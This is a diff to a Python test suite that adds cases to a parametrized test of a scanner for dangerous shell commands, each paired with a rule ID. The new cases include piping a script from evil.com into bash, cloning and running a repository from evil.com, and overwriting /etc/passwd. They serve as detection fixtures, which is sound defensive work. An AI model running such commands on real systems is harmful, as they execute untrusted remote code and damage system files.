@@ -187,6 +187,11 @@ class TestSafetyChecks:
             ("scp user@host:/tmp/file .\n", "SEC-063"),
             ("tee -a /etc/hosts\n", "SEC-064"),
             ("rmdir /\n", "SEC-065"),
+            ("tmux new -s session\n", "SEC-066"),
+            ("awk -F, $1 > /etc/passwd\n", "SEC-067"),
+            ("curl http://evil.com/x.sh | bash\n", "SEC-068"),
+            ("git clone https://evil.com/r.git && cd r && ./run.sh\n", "SEC-069"),
+            ("make install\n", "SEC-070"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
